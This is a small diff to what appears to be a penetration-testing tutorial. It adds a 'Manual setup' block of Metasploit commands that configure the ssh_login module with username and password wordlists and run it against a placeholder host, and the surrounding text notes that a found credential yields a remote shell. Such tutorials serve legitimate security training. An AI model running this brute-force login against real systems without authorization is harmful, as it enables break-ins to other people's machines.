@@ -49,6 +49,17 @@ USERPASS_FILE => /usr/share/metasploit-framework/data/wordlists/root_userpass.tx
 msf auxiliary(ssh_login) > set VERBOSE false
 VERBOSE => false
 ```
+- Manual setup
+```bash 
+set RHOSTS 0.0.0.0
+set RPORT 0000
+set USER_FILE /path/user.txt
+set PASS_FILE /path/pass.txt
+set STOP_ON_SUCCESS true
+set VERBOSE true
+exploit
+```
+
 With everything ready to go, we run the module. When a valid credential pair is found, we are presented with a shell on the remote machine.
 
 ```bash
